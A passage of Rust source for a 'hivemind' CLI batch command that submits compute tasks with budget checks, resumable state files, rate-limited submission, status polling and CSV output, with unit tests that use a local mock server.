    max_cpt_per_task: Option<i64>,
    precheck: bool,
    skip_invalid: bool,
    cpu_score: Option<i32>,
    memory_gb: Option<i32>,
    gpu_score: Option<i32>,
    gpu_memory_gb: Option<i32>,
    storage_gb: Option<i64>,
    host_count: Option<i32>,
}

impl BatchSettings {
    fn of(command: &BatchCommand) -> Self {
        Self {
            replicas: command.replicas,
            max_cpt_per_task: command.max_cpt_per_task,
            precheck: command.precheck,
            skip_invalid: command.skip_invalid,
            cpu_score: command.cpu_score,
            memory_gb: command.memory_gb,
            gpu_score: command.gpu_score,
            gpu_memory_gb: command.gpu_memory_gb,
            storage_gb: command.storage_gb,
            host_count: command.host_count,
        }
    }
}

#[derive(Debug, Serialize, Deserialize, PartialEq, Eq)]
struct BatchStateRow {
    input_sha256: String,
    /// The cap the task is submitted with. Absent for an input the pre-check refused.
    max_cpt: Option<i64>,
    /// Why the pre-check refused the input.
    skipped: Option<String>,
}

fn batch_state_path(out_path: &str) -> String {
    format!("{out_path}.state.json")
}

fn build_batch_state(
    command: &BatchCommand,
    prefix: &str,
    source: &str,
    inputs: &[String],
    plan: &[std::result::Result<i64, String>],
) -> BatchState {
    BatchState {
        version: BATCH_STATE_VERSION,
        prefix: prefix.to_owned(),
        source_sha256: general_compute_runtime::sha256_digest(source.as_bytes()),
        settings: BatchSettings::of(command),
        rows: inputs
            .iter()
            .zip(plan)
            .map(|(input, entry)| BatchStateRow {
                input_sha256: general_compute_runtime::sha256_digest(input.as_bytes()),
                max_cpt: entry.as_ref().ok().copied(),
                skipped: entry.as_ref().err().cloned(),
            })
            .collect(),
    }
}

/// The plan a saved batch was started with.
fn plan_from_state(state: &BatchState) -> Vec<std::result::Result<i64, String>> {
    state
        .rows
        .iter()
        .map(|row| match row.max_cpt {
            Some(cap) => Ok(cap),
            None => Err(row
                .skipped
                .clone()
                .unwrap_or_else(|| "skipped by the pre-check".to_owned())),
        })
        .collect()
}

/// Whether a saved batch may be continued with the files and flags given now.
fn verify_batch_state(
    state: &BatchState,
    command: &BatchCommand,
    prefix: &str,
    source: &str,
    inputs: &[String],
) -> Result<()> {
    if state.version != BATCH_STATE_VERSION {
        return Err(anyhow!(
            "the state file was written by a different version of this command"
        ));
    }
    if state.prefix != prefix {
        return Err(anyhow!(
            "the state file belongs to batch {}, not {}",
            state.prefix,
            prefix
        ));
    }
    if state.source_sha256 != general_compute_runtime::sha256_digest(source.as_bytes()) {
        return Err(anyhow!(
            "the function source changed since the batch started; resuming would attach its task ids to a different function"
        ));
    }
    if state.rows.len() != inputs.len() {
        return Err(anyhow!(
            "the inputs file has {} inputs; the batch started with {}",
            inputs.len(),
            state.rows.len()
        ));
    }
    if let Some(index) = state.rows.iter().zip(inputs).position(|(row, input)| {
        row.input_sha256 != general_compute_runtime::sha256_digest(input.as_bytes())
    }) {
        return Err(anyhow!(
            "input {} changed since the batch started; resuming would attach its task id to different data",
            index + 1
        ));
    }
    if state.settings != BatchSettings::of(command) {
        return Err(anyhow!(
            "the resource or replica settings differ from the ones the batch started with"
        ));
    }
    Ok(())
}

async fn load_batch_state(path: &str) -> Result<BatchState> {
    let text = tokio::fs::read_to_string(path).await.map_err(|_| {
        anyhow!(
            "there is no state file at {path}; a batch can only be resumed with the --out and --task-prefix it started with"
        )
    })?;
    serde_json::from_str(&text).map_err(|e| anyhow!("the state file {path} cannot be read: {e}"))
}

/// Writes the state through a temporary file, so an interrupted write never leaves half a state.
async fn save_batch_state(path: &str, state: &BatchState) -> Result<()> {
    let text = serde_json::to_string_pretty(state)?;
    let temporary = format!("{path}.tmp");
    tokio::fs::write(&temporary, text)
        .await
        .map_err(|e| anyhow!("failed to write {}: {}", temporary, e))?;
    tokio::fs::rename(&temporary, path)
        .await
        .map_err(|e| anyhow!("failed to write {}: {}", path, e))
}

/// Stops the batch when an input cannot run, unless the rest may go ahead without it.
fn check_refusals(plan: &[std::result::Result<i64, String>], skip_invalid: bool) -> Result<()> {
    let refused: Vec<(usize, &String)> = plan
        .iter()
        .enumerate()
        .filter_map(|(index, entry)| entry.as_ref().err().map(|reason| (index, reason)))
        .collect();
    if !refused.is_empty() && !skip_invalid {
        return Err(anyhow!("{}", refusal_report(&refused, plan.len())));
    }
    if refused.len() == plan.len() {
        return Err(anyhow!(
            "none of the {} inputs can run, so nothing was submitted",
            plan.len()
        ));
    }
    Ok(())
}

/// Why the batch was stopped, naming the inputs that cannot run.
fn refusal_report(refused: &[(usize, &String)], total: usize) -> String {
    const SHOWN: usize = 10;
    let mut text = format!(
        "{} of {} inputs cannot run, so nothing was submitted:",
        refused.len(),
        total
    );
    for (index, reason) in refused.iter().take(SHOWN) {
        text.push_str(&format!("\n  input {}: {}", index + 1, reason));
    }
    if refused.len() > SHOWN {
        text.push_str(&format!("\n  ... and {} more", refused.len() - SHOWN));
    }
    text.push_str("\nFix them, or pass --skip-invalid to submit the rest.");
    text
}

/// The line printed once the batch is planned and before the first task is sent.
fn plan_summary(
    label: &str,
    prefix: &str,
    caps: &[i64],
    skipped: usize,
    worst_case: i64,
    command: &BatchCommand,
    out_path: &str,
) -> String {
    let (low, high) = caps.iter().fold((i64::MAX, i64::MIN), |(low, high), cap| {
        (low.min(*cap), high.max(*cap))
    });
    let per_task = if low == high {
        format!("{low} CPT each")
    } else {
        format!("{low} to {high} CPT each")
    };
    let basis = if command.precheck && command.max_cpt_per_task.is_none() {
        ", the exact need of each input from a local run"
    } else {
        ""
    };
    let skipped = if skipped == 0 {
        String::new()
    } else {
        format!(" ({skipped} inputs skipped)")
    };
    format!(
        "{label} {prefix}: {} tasks{skipped} at {per_task}{basis}, at most {worst_case} CPT in total (cap {}). Results: {out_path}",
        caps.len(),
        command.max_total_cpt
    )
}

/// The per-minute submission limit is applied per owner. Pacing below it keeps a batch from tripping the limit.
fn submit_interval(per_minute: u32) -> Duration {
    Duration::from_millis(60_000 / u64::from(per_minute.max(1)))
}

fn is_terminal_task_status(status: &str) -> bool {
    matches!(status, "COMPLETED" | "FAILED" | "TIMED_OUT" | "CANCELLED")
}

fn csv_field(value: &str) -> String {
    // CSV quoting alone does not prevent formulas. Mark dangerous cells as text
    // before escaping, including prefixes a spreadsheet may trim or normalize.
    let start =
        value.trim_start_matches(|c: char| c.is_whitespace() || c.is_control() || c == '\u{feff}');
    let as_text = value.starts_with(['\t', '\r', '\n'])
        || start.starts_with(['=', '+', '-', '@', '＝', '＋', '－', '＠']);
    if as_text || value.contains([',', '"', '\n', '\r']) {
        let prefix = if as_text { "'" } else { "" };
        format!("\"{prefix}{}\"", value.replace('"', "\"\""))
    } else {
        value.to_string()
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct BatchRow {
    index: usize,
    task_id: String,
    input: String,
    status: String,
    output: String,
    billed_cpt: Option<i64>,
    message: String,
}

impl BatchRow {
    // A row still needs polling when its task was accepted and has not reached a final state.
    fn is_open(&self) -> bool {
        !self.was_never_accepted() && !is_terminal_task_status(&self.status)
    }

    // These rows have no task on the network, so there is nothing to look up for them.
    fn was_never_accepted(&self) -> bool {
        matches!(
            self.status.as_str(),
            "SUBMIT_FAILED" | "NOT_SUBMITTED" | PRECHECK_FAILED
        )
    }
}

fn render_batch_csv(rows: &[BatchRow]) -> String {
    let mut csv = String::from(BATCH_RESULT_HEADER);
    csv.push('\n');
    for row in rows {
        let billed = row
            .billed_cpt
            .map(|cpt| cpt.to_string())
            .unwrap_or_default();
        let fields = [
            row.index.to_string(),
            row.task_id.clone(),
            row.status.clone(),
            row.output.clone(),
            billed,
            row.message.clone(),
            row.input.clone(),
        ];
        let line: Vec<String> = fields.iter().map(|field| csv_field(field)).collect();
        csv.push_str(&line.join(","));
        csv.push('\n');
    }
    csv
}

fn batch_request_body(
    command: &BatchCommand,
    source: &str,
    input: &str,
) -> serde_json::Map<String, serde_json::Value> {
    let mut body = serde_json::Map::new();
    body.insert("runtime".into(), "hcode".into());
    body.insert("task_source".into(), source.into());
    body.insert("torrent".into(), input.into());
    if let Some(v) = command.cpu_score {
        body.insert("cpu_score".into(), v.into());
    }
    if let Some(v) = command.memory_gb {
        body.insert("memory_gb".into(), v.into());
    }
    if let Some(v) = command.gpu_score {
        body.insert("gpu_score".into(), v.into());
    }
    if let Some(v) = command.gpu_memory_gb {
        body.insert("gpu_memory_gb".into(), v.into());
    }
    if let Some(v) = command.storage_gb {
        body.insert("storage_gb".into(), v.into());
    }
    if let Some(v) = command.host_count {
        body.insert("host_count".into(), v.into());
    }
    if let Some(replicas) = command.replicas {
        // A policy needs both numbers: a replica count with the default quorum can be invalid.
        body.insert("managed_replica_count".into(), replicas.into());
        body.insert("managed_quorum".into(), check::majority(replicas).into());
    }
    body
}

/// Quoting prices the resources and host count only. The checks it shares with task creation still require a
/// positive budget for hcode, so the quote carries a placeholder of 1 CPT that the price does not depend on.
fn batch_quote_body(
    command: &BatchCommand,
    source: &str,
    input: &str,
) -> serde_json::Map<String, serde_json::Value> {
    let mut body = batch_request_body(command, source, input);
    body.insert("max_cpt".into(), 1.into());
    body
}

async fn quote_batch_price(
    client: &reqwest::Client,
    command: &BatchCommand,
    token: &str,
    source: &str,
    sample_input: &str,
) -> Result<i64> {
    post_quote(
        client,
        &command.api_base,
        token,
        &batch_quote_body(command, source, sample_input),
    )
    .await
}

/// Asks the Master for the resource price of a task body.
async fn post_quote(
    client: &reqwest::Client,
    api_base: &str,
    token: &str,
    body: &serde_json::Map<String, serde_json::Value>,
) -> Result<i64> {
    let url = format!("{}/api/tasks/quote", api_base);
    let response = client
        .post(&url)
        .bearer_auth(token)
        .json(body)
        .send()
        .await
        .map_err(|e| anyhow!("price quote request failed: {}", e))?;
    let status = response.status();
    let body: serde_json::Value = response
        .json()
        .await
        .map_err(|e| anyhow!("failed to decode price quote: {}", e))?;
    if !status.is_success() || body.get("success").and_then(|value| value.as_bool()) != Some(true) {
        return Err(anyhow!("price quote failed: {}", status));
    }
    body.get("quoted_cpt")
        .and_then(|value| value.as_i64())
        .ok_or_else(|| anyhow!("price quote response has no quoted_cpt"))
}

async fn pace_submission(next_submit_at: &mut Instant, interval: Duration) {
    let wait = next_submit_at.saturating_duration_since(Instant::now());
    if !wait.is_zero() {
        tokio::time::sleep(wait).await;
    }
    *next_submit_at = Instant::now() + interval;
}

async fn submit_batch_task(
    client: &reqwest::Client,
    api_base: &str,
    token: &str,
    body: &serde_json::Value,
    next_submit_at: &mut Instant,
    interval: Duration,
    conflict_is_ok: bool,
) -> Result<()> {
    const MAX_ATTEMPTS: u32 = 5;
    let url = format!("{}/api/tasks", api_base);
    for attempt in 1..=MAX_ATTEMPTS {
        pace_submission(next_submit_at, interval).await;
        let response = client
            .post(&url)
            .bearer_auth(token)
            .json(body)
            .send()
            .await
            .map_err(|e| anyhow!("task create request failed: {}", e))?;
        let status = response.status();
        let reply: serde_json::Value = response.json().await.unwrap_or(serde_json::Value::Null);
        if status.is_success()
            && reply.get("success").and_then(|value| value.as_bool()) == Some(true)
        {
            return Ok(());
        }
        // When resuming, the saved state has already shown that the data behind this task id is
        // the data of this batch, so a task that is already there is a task that was submitted.
        if status == reqwest::StatusCode::CONFLICT && conflict_is_ok {
            return Ok(());
        }
        if status == reqwest::StatusCode::TOO_MANY_REQUESTS && attempt < MAX_ATTEMPTS {
            // The submission window is one minute. Wait for it to reset before trying this task again.
            tokio::time::sleep(Duration::from_secs(60)).await;
            *next_submit_at = Instant::now();
            continue;
        }
        let message = reply
            .get("message")
            .and_then(|value| value.as_str())
            .map(str::to_owned)
            .unwrap_or_else(|| status.to_string());
        return Err(anyhow!("{}", message));
    }
    Err(anyhow!("task submission kept hitting the rate limit"))
}

async fn fetch_task_snapshots(
    client: &reqwest::Client,
    api_base: &str,
    token: &str,
    task_ids: &[String],
) -> Result<std::collections::HashMap<String, serde_json::Value>> {
    let mut snapshots = std::collections::HashMap::new();
    // The default list is only the newest 100 tasks, possibly from another batch.
    // Query this batch's IDs in bounded, sequential requests instead. Twenty
    // maximum-length IDs also fit within a typical proxy's 8 KiB request-line cap.
    for ids in task_ids.chunks(20) {
        snapshots.extend(fetch_task_snapshot_chunk(client, api_base, token, ids).await?);
    }
    Ok(snapshots)
}

async fn fetch_task_snapshot_chunk(
    client: &reqwest::Client,
    api_base: &str,
    token: &str,
    task_ids: &[String],
) -> Result<std::collections::HashMap<String, serde_json::Value>> {
    let url = format!("{}/api/tasks", api_base);
    let response = client
        .get(&url)
        .query(&[("task_ids", task_ids.join(","))])
        .bearer_auth(token)
        .send()
        .await
        .map_err(|e| anyhow!("task list request failed: {}", e))?;
    let status = response.status();
    let body: serde_json::Value = response
        .json()
        .await
        .map_err(|e| anyhow!("failed to decode task list: {}", e))?;
    if !status.is_success() {
        return Err(anyhow!("task list failed: {}", status));
    }
    let tasks = body
        .get("tasks")
        .and_then(|value| value.as_array())
        .ok_or_else(|| anyhow!("task list has no tasks array"))?;
    Ok(tasks
        .iter()
        .filter_map(|task| {
            task.get("task_id")
                .and_then(|value| value.as_str())
                .map(|id| (id.to_owned(), task.clone()))
        })
        .collect())
}

fn apply_batch_snapshots(
    rows: &mut [BatchRow],
    snapshots: &std::collections::HashMap<String, serde_json::Value>,
) {
    for row in rows
        .iter_mut()
        .filter(|row| row.status != "SUBMIT_FAILED" && row.status != PRECHECK_FAILED)
    {
        let Some(task) = snapshots.get(&row.task_id) else {
            continue;
        };
        if let Some(status) = task.get("status").and_then(|value| value.as_str()) {
            row.status = status.to_string();
        }
        row.output = task
            .get("output")
            .and_then(|value| value.as_str())
            .unwrap_or_default()
            .to_string();
        row.billed_cpt = task.get("billed_amount").and_then(|value| value.as_i64());
        row.message = task
            .get("status_message")
            .and_then(|value| value.as_str())
            .unwrap_or_default()
            .to_string();
    }
}

/// Runs one hcode function over every input line. The total budget is checked before anything is submitted.
pub async fn run_batch(command: BatchCommand) -> Result<()> {
    let source = tokio::fs::read_to_string(&command.source_path)
        .await
        .map_err(|e| anyhow!("failed to read {}: {}", command.source_path, e))?;
    if source.trim().is_empty() {
        return Err(anyhow!("{} is empty", command.source_path));
    }
    let inputs_text = tokio::fs::read_to_string(&command.inputs_path)
        .await
        .map_err(|e| anyhow!("failed to read {}: {}", command.inputs_path, e))?;
    let inputs = parse_batch_inputs(&inputs_text)?;

    let prefix = command
        .task_prefix
        .clone()
        .unwrap_or_else(|| format!("batch-{}", &uuid::Uuid::new_v4().simple().to_string()[..8]));
    let task_ids: Vec<String> = (0..inputs.len())
        .map(|index| batch_task_id(&prefix, index))
        .collect();
    if let Some(invalid) = task_ids
        .iter()
        .find(|id| !is_safe_task_id(id) || id.len() > hivemind_proto::TASK_ID_MAX_BYTES)
    {
        return Err(anyhow!(
            "task id {} is not valid; choose a shorter --task-prefix",
            invalid
        ));
    }
    let out_path = command
        .out_path
        .clone()
        .unwrap_or_else(|| format!("{prefix}-results.csv"));

    // A batch keeps a state file next to its results. A new batch never overwrites one, and a
    // resumed batch must match it exactly.
    let state_path = batch_state_path(&out_path);
    let saved = if command.resume {
        let state = load_batch_state(&state_path).await?;
        verify_batch_state(&state, &command, &prefix, &source, &inputs)?;
        Some(state)
    } else {
        if tokio::fs::try_exists(&state_path).await.unwrap_or(false) {
            return Err(anyhow!(
                "{state_path} already exists: pass --resume to continue that batch, or choose another --task-prefix or --out"
            ));
        }
        None
    };

    // A local run of every input finds the ones that cannot run and prices each, before anything
    // is sent. A resumed batch keeps the plan it started with.
    let replicas = command.replicas.unwrap_or(check::DEFAULT_REPLICAS);
    let outcomes = if command.precheck && saved.is_none() {
        println!("Checking {} inputs with a local run...", inputs.len());
        let (check_source, check_inputs) = (source.clone(), inputs.clone());
        let outcomes = tokio::task::spawn_blocking(move || {
            check::precheck_inputs(
                &check_source,
                &check_inputs,
                replicas,
                check::default_limits(),
            )
        })
        .await
        .map_err(|e| anyhow!("the local run stopped unexpectedly: {}", e))?;
        // Whether an input can run does not depend on the price, so this is settled before
        // signing in and a batch that cannot go ahead costs no request at all.
        check_refusals(
            &check::plan_caps(&outcomes, command.max_cpt_per_task, 0),
            command.skip_invalid,
        )?;
        Some(outcomes)
    } else {
        None
    };

    let client = reqwest::Client::new();
    let token = login(
        &client,
        &command.api_base,
        &command.username,
        &command.password,
    )
    .await?;

    let plan: Vec<std::result::Result<i64, String>> = match &saved {
        Some(state) => plan_from_state(state),
        None => {
            // The price depends on the resources and host count, not on the input, so one quote
            // prices the batch.
            let unit_cpt =
                quote_batch_price(&client, &command, &token, &source, &inputs[0]).await?;
            if let Some(cap) = command.max_cpt_per_task {
                if cap < unit_cpt {
                    return Err(anyhow!(
                        "--max-cpt-per-task {} is below the quoted price of {} CPT per task",
                        cap,
                        unit_cpt
                    ));
                }
            }
            match &outcomes {
                Some(outcomes) => check::plan_caps(outcomes, command.max_cpt_per_task, unit_cpt),
                None => {
                    let cap = command
                        .max_cpt_per_task
                        .unwrap_or_else(|| DEFAULT_BATCH_TASK_CPT.max(unit_cpt));
                    vec![Ok(cap); inputs.len()]
                }
            }
        }
    };
    let skipped = plan.iter().filter(|entry| entry.is_err()).count();
    let caps: Vec<i64> = plan
        .iter()
        .filter_map(|entry| entry.as_ref().ok().copied())
        .collect();
    let worst_case = batch_worst_case_cpt(&caps)?;
    if worst_case > command.max_total_cpt {
        return Err(anyhow!(
            "{} tasks can spend up to {} CPT, above --max-total-cpt {}; raise the cap or split the inputs",
            caps.len(),
            worst_case,
            command.max_total_cpt
        ));
    }
    let label = if saved.is_some() {
        "Resuming batch"
    } else {
        "Batch"
    };
    println!(
        "{}",
        plan_summary(label, &prefix, &caps, skipped, worst_case, &command, &out_path)
    );

    let mut rows: Vec<BatchRow> = inputs
        .iter()
        .enumerate()
        .map(|(index, input)| {
            let (status, message) = match &plan[index] {
                Ok(_) => ("NOT_SUBMITTED", String::new()),
                Err(reason) => (PRECHECK_FAILED, reason.clone()),
            };
            BatchRow {
                index: index + 1,
                task_id: task_ids[index].clone(),
                input: input.clone(),
                status: status.into(),
                output: String::new(),
                billed_cpt: None,
                message,
            }
        })
        .collect();

    if saved.is_none() {
        // Written before the first task is sent, so an interrupted batch can always be resumed.
        save_batch_state(
            &state_path,
            &build_batch_state(&command, &prefix, &source, &inputs, &plan),
        )
        .await?;
    } else {
        // Tasks sent before the interruption are on the network; only the missing ones are sent.
        let planned_ids: Vec<String> = rows
            .iter()
            .zip(&plan)
            .filter(|(_, entry)| entry.is_ok())
            .map(|(row, _)| row.task_id.clone())
            .collect();
        let snapshots = fetch_task_snapshots(&client, &command.api_base, &token, &planned_ids)
            .await
            .map_err(|e| {
                anyhow!("cannot tell which tasks already exist, so nothing was resubmitted: {e}")
            })?;
        apply_batch_snapshots(&mut rows, &snapshots);
        println!(
            "{} of {} tasks already exist; submitting the rest",
            snapshots.len(),
            planned_ids.len()
        );
    }

    let interval = submit_interval(command.per_minute);
    let mut next_submit_at = Instant::now();
    for index in 0..rows.len() {
        let Ok(cap) = plan[index] else { continue };
        if rows[index].status != "NOT_SUBMITTED" {
            continue;
        }
        let body = serde_json::Value::Object({
            let mut body = batch_request_body(&command, &source, &inputs[index]);
            body.insert("task_id".into(), rows[index].task_id.clone().into());
            body.insert("max_cpt".into(), cap.into());
            body
        });
        match submit_batch_task(
            &client,
            &command.api_base,
            &token,
            &body,
            &mut next_submit_at,
            interval,
            saved.is_some(),
        )
        .await
        {
            Ok(()) => rows[index].status = "SUBMITTED".into(),
            Err(error) => {
                rows[index].status = "SUBMIT_FAILED".into();
                rows[index].message = error.to_string();
            }
        }
    }

    let deadline = Instant::now() + Duration::from_secs(command.timeout_secs);
    loop {
        let task_ids: Vec<String> = rows
            .iter()
            .filter(|row| row.is_open())
            .map(|row| row.task_id.clone())
            .collect();
        match fetch_task_snapshots(&client, &command.api_base, &token, &task_ids).await {
            Ok(snapshots) => apply_batch_snapshots(&mut rows, &snapshots),
            Err(error) => eprintln!("warning: could not read task status: {error}"),
        }
        if !rows.iter().any(BatchRow::is_open) || Instant::now() >= deadline {
            break;
        }
        tokio::time::sleep(Duration::from_secs(command.poll_secs)).await;
    }
    for row in rows.iter_mut().filter(|row| row.is_open()) {
        row.message = format!(
            "still {} when the wait ended; check with `hivemind status {}`",
            row.status, row.task_id
        );
    }

    tokio::fs::write(&out_path, render_batch_csv(&rows))
        .await
        .map_err(|e| anyhow!("failed to write {}: {}", out_path, e))?;
    let completed = rows.iter().filter(|row| row.status == "COMPLETED").count();
    let billed: i64 = rows.iter().filter_map(|row| row.billed_cpt).sum();
    println!(
        "Completed {} of {} tasks; billed {} CPT. Results: {}",
        completed,
        rows.len(),
        billed,
        out_path
    );
    if completed != rows.len() {
        return Err(anyhow!(
            "{} of {} tasks did not complete; see {}",
            rows.len() - completed,
            rows.len(),
            out_path
        ));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn batch_tracks_all_thousand_ids_in_bounded_requests() {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let api = format!("http://{}", listener.local_addr().unwrap());
        let server = tokio::spawn(async move {
            for _ in 0..50 {
                let (mut socket, _) = listener.accept().await.unwrap();
                let mut request = Vec::new();
                let mut buffer = [0_u8; 4096];
                while !request.windows(4).any(|bytes| bytes == b"\r\n\r\n") {
                    let n = socket.read(&mut buffer).await.unwrap();
                    assert!(n > 0);
                    request.extend_from_slice(&buffer[..n]);
                }
                let request = String::from_utf8(request).unwrap();
                let path = request.split_whitespace().nth(1).unwrap();
                let url = reqwest::Url::parse(&format!("http://localhost{path}")).unwrap();
                let ids = url
                    .query_pairs()
                    .find(|(key, _)| key == "task_ids")
                    .unwrap()
                    .1
                    .into_owned();
                let ids: Vec<&str> = ids.split(',').collect();
                assert_eq!(ids.len(), 20);
                let tasks: Vec<_> = ids.into_iter().map(|id| serde_json::json!({
                    "task_id": id, "status": "COMPLETED", "output": "42", "billed_amount": 7,
                })).collect();
                let body = serde_json::json!({"success": true, "tasks": tasks}).to_string();
                let response = format!("HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\nContent-Length: {}\r\n\r\n{}", body.len(), body);
                socket.write_all(response.as_bytes()).await.unwrap();
            }
        });
        let ids: Vec<String> = (0..1000).map(|index| format!("batch-{index}")).collect();
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(5))
            .build()
            .unwrap();
        let snapshots = fetch_task_snapshots(&client, &api, "owner", &ids)
            .await
            .unwrap();
        server.await.unwrap();
        let mut rows: Vec<_> = ids
            .into_iter()
            .enumerate()
            .map(|(index, task_id)| BatchRow {
                index,
                task_id,
                input: "{}".into(),
                status: "SUBMITTED".into(),
                output: String::new(),
                billed_cpt: None,
                message: String::new(),
            })
            .collect();
        apply_batch_snapshots(&mut rows, &snapshots);
        assert_eq!(snapshots.len(), 1000);
        assert!(rows
            .iter()
            .all(|row| !row.is_open() && row.output == "42" && row.billed_cpt == Some(7)));
    }

    #[test]
    fn compose_passes_the_signing_public_key_to_nodepool_and_worker() {
        let compose = include_str!("../../../../docker-compose.yml");
        let nodepool = compose
            .split("  nodepool:")
            .nth(1)
            .unwrap()
            .split("\n  master:")
            .next()
            .unwrap();
        assert!(nodepool
            .contains("WORKER_EXECUTION_PRIVATE_KEY_PEM: ${WORKER_EXECUTION_PRIVATE_KEY_PEM:?"));
        assert!(nodepool
            .contains("WORKER_EXECUTION_PUBLIC_KEY_PEM: ${WORKER_EXECUTION_PUBLIC_KEY_PEM:?"));
        let worker = compose
            .split("  worker:")
            .nth(1)
            .unwrap()
            .split("\n  master-ui:")
            .next()
            .unwrap();
        assert!(
            worker.contains("WORKER_EXECUTION_PUBLIC_KEY_PEM: ${WORKER_EXECUTION_PUBLIC_KEY_PEM:?")
        );
    }

    #[test]
    fn submit_usage_documents_inline_input_and_rejects_input_file() {
        let args = vec!["hivemind".to_string(), "submit".to_string()];
        let usage = parse_cli_args(&args)
            .expect_err("missing source should display usage")
            .to_string();
        assert!(usage.contains("[--input <json>]"));
        assert!(!usage.contains("--input-file"));

        let args = vec![
            "hivemind".to_string(),
            "submit".to_string(),
            "sum.hdsl".to_string(),
            "--input-file".to_string(),
            "input.json".to_string(),
        ];
        let err = parse_cli_args(&args).expect_err("input-file is not a supported submit flag");
        assert_eq!(err.to_string(), "unknown submit flag --input-file");
    }

    #[test]
    fn parses_submit_function_with_resource_and_budget_flags() {
        let args = vec![
            "hivemind".to_string(),
            "submit".to_string(),
            "job.py".to_string(),
            "--api".to_string(),
            "http://localhost:8082/".to_string(),
            "--username".to_string(),
            "alice".to_string(),
            "--password".to_string(),
            "secret".to_string(),
            "--task-id".to_string(),
            "render-001".to_string(),
            "--input".to_string(),
            "{\"n\":1}".to_string(),
            "--cpu-score".to_string(),
            "250".to_string(),
            "--memory-gb".to_string(),
            "8".to_string(),
            "--gpu-score".to_string(),
            "100".to_string(),
            "--gpu-memory-gb".to_string(),
            "6".to_string(),
            "--storage-gb".to_string(),
            "20".to_string(),
            "--host-count".to_string(),
            "2".to_string(),
            "--max-cpt".to_string(),
            "500".to_string(),
        ];

        let command = parse_cli_args(&args).expect("submit args should parse");
        let submit = match command {
            CliCommand::Submit(submit) => submit,
            _ => panic!("expected submit command"),
        };

        assert_eq!(submit.api_base, "http://localhost:8082");
        assert_eq!(submit.source_path, "job.py");
        assert_eq!(submit.input, "{\"n\":1}");
        assert_eq!(submit.username, "alice");
        assert_eq!(submit.password, "secret");
        assert_eq!(submit.task_id, "render-001");
        assert_eq!(submit.cpu_score, Some(250));
        assert_eq!(submit.memory_gb, Some(8));
        assert_eq!(submit.gpu_score, Some(100));
        assert_eq!(submit.gpu_memory_gb, Some(6));
        assert_eq!(submit.storage_gb, Some(20));
        assert_eq!(submit.host_count, Some(2));
        assert_eq!(submit.max_cpt, Some(500));
    }

    fn submit_command(extra: &[&str]) -> Result<SubmitCommand> {
        let mut args: Vec<String> = ["hivemind", "submit", "job.hmf"]
            .iter()
            .map(|part| (*part).to_owned())
            .collect();
        args.extend(extra.iter().map(|part| (*part).to_owned()));
        match parse_cli_args(&args)? {
            CliCommand::Submit(submit) => Ok(submit),
            _ => panic!("expected submit command"),
        }
    }

    #[test]
    fn submit_can_price_itself_from_a_local_run() {
        let submit = submit_command(&["--max-cpt", "auto", "--replicas", "5"]).unwrap();
        assert!(submit.max_cpt_auto);
        assert_eq!(submit.max_cpt, None);
        assert_eq!(submit.replicas, Some(5));

        // The last flag wins, so a script can override a default it inherited.
        let number_last = submit_command(&["--max-cpt", "auto", "--max-cpt", "500"]).unwrap();
        assert!(!number_last.max_cpt_auto);
        assert_eq!(number_last.max_cpt, Some(500));
        let auto_last = submit_command(&["--max-cpt", "500", "--max-cpt", "auto"]).unwrap();
        assert!(auto_last.max_cpt_auto);
        assert_eq!(auto_last.max_cpt, None);

        let plain = submit_command(&[]).unwrap();
        assert!(!plain.max_cpt_auto);
        assert_eq!(plain.replicas, None);
    }

    #[test]
    fn submit_rejects_an_invalid_replica_count_or_cap() {
        for bad in ["1", "8", "0", "three"] {
            assert!(submit_command(&["--replicas", bad]).is_err(), "{bad}");
        }
        assert!(submit_command(&["--max-cpt", "automatic"]).is_err());
    }

    #[test]
    fn the_resource_quote_for_a_submit_carries_a_placeholder_budget() {
        let submit = submit_command(&[
            "--input",
            "{\"n\":1}",
            "--cpu-score",
            "250",
            "--host-count",
            "2",
            "--max-cpt",
            "auto",
        ])
        .unwrap();
        let body = submit_quote_body(&submit, "n;");
        assert_eq!(body.get("runtime"), Some(&serde_json::json!("hcode")));
        assert_eq!(body.get("task_source"), Some(&serde_json::json!("n;")));
        assert_eq!(body.get("torrent"), Some(&serde_json::json!("{\"n\":1}")));
        assert_eq!(body.get("cpu_score"), Some(&serde_json::json!(250)));
        assert_eq!(body.get("host_count"), Some(&serde_json::json!(2)));
        assert_eq!(body.get("max_cpt"), Some(&serde_json::json!(1)));
        assert!(body.get("memory_gb").is_none());
    }

    #[tokio::test]
    async fn auto_budget_prices_a_function_that_runs_locally() {
        let submit =
            submit_command(&["--input", "{\"values\": [10, 20, 30]}", "--max-cpt", "auto"])
                .unwrap();
        let source = "let total = 0;\nfor value in get(input, \"values\") {\n  let total = total + value;\n}\ntotal;";
        let budget = local_task_budget(&submit, source).await.unwrap();
        assert_eq!(budget.replica_usage, 25);
        assert_eq!(budget.replica_count, 3);
        assert_eq!(budget.task_budget, 82);

        let five = submit_command(&[
            "--input",
            "{\"values\": [10, 20, 30]}",
            "--max-cpt",
            "auto",
            "--replicas",
            "5",
        ])
        .unwrap();
        assert_eq!(
            local_task_budget(&five, source).await.unwrap().task_budget,
            137
        );
    }

    #[tokio::test]
    async fn auto_budget_refuses_before_anything_is_sent() {
        let without_input = submit_command(&["--max-cpt", "auto"]).unwrap();
        let error = local_task_budget(&without_input, "1;").await.unwrap_err();
        assert!(error.to_string().contains("needs --input"), "{error}");

        let broken = submit_command(&["--input", "{}", "--max-cpt", "auto"]).unwrap();
        let error = local_task_budget(&broken, "let y = ;").await.unwrap_err();
        let text = error.to_string();
        assert!(text.contains("nothing was submitted"), "{text}");
        assert!(text.contains("parse_error"), "{text}");
    }

    #[test]
    fn submit_rejects_unsafe_explicit_task_id() {
        let args = vec![
            "hivemind".to_string(),
            "submit".to_string(),
            "job.py".to_string(),
            "--task-id".to_string(),
            "../bad".to_string(),
            "--username".to_string(),
            "alice".to_string(),
            "--password".to_string(),
            "secret".to_string(),
        ];

        let err = parse_cli_args(&args).expect_err("unsafe submit task id should be rejected");
        assert!(err.to_string().contains("task id"));
    }

    #[test]
    fn parses_status_and_result_commands_with_auth_flags() {
        let status_args = vec![
            "hivemind".to_string(),
            "status".to_string(),
            "task-123".to_string(),
            "--api".to_string(),
